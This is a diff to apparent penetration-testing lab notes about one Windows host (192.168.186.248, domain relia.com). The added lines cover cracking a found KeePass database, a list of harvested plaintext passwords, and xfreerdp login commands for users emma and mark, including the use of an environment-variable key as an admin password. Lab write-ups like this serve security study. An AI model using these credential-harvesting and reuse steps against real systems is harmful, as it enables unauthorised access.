@@ -276,6 +276,7 @@ Host script results:
 ```
 
 # VM 13 .248
+- External.dmz
 ```
 PORT      STATE SERVICE       VERSION
 80/tcp    open  http          Microsoft IIS httpd 10.0
@@ -348,7 +349,37 @@ Host script results:
 |_  start_date: N/A
 ```
 
+## Interesting Info
+1. Login as zachary (fireball)
+```
+    can read Users Folder somehow
+    -> found Emma desktop database.kdbx (password cracked = welcome1)
+
+    Retired: bo:Luigi=Papal1963
+
+    Windows: emma:SomersetVinyl1!
+            Old:HabitsAgesEnd123
+    DB password: sa:SAPassword_1998 (old password) | newpassword? welcome1?
+
+    [From env variable]
+    AppKey:!8@aBRBYdb3!
+
+    !8@aBRBYdb3!
+    
+```
+## Foothold
+```
+     xfreerdp /v:192.168.186.248 /u:emma /p:'SomersetVinyl1!' /d:relia.com /cert-ignore
+```
+## Root
+1. found 'appkey' in env variable and the value is mark's password... loll
+```
+    xfreerdp /v:192.168.186.248 /u:mark /p:'!8@aBRBYdb3!' /d:relia.com /cert-ignore
+```
+
+
 # VM 14 .249
+- LEGACY
 ```
 PORT      STATE SERVICE       VERSION
 80/tcp    open  http          Microsoft IIS httpd 10.0
